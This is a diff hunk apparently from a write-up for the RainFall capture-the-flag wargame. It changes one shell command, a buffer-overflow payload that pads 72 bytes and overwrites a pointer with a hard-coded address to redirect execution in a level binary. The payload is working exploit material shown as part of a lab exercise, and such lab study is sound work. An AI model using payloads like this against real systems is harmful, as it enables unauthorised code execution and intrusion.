@@ -79,5 +79,5 @@ Exit back to user level6, then run the source with an updated address of functio
 ```
 level7@RainFall:/tmp$ exit
 exit
-level6@RainFall:~$ /home/user/level7/level6_source $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
+level6@RainFall:~$ /home/user/level7/level6_source $(python -c 'print "A" * 72 + "\x88\x84\x04\x08"')
 ```
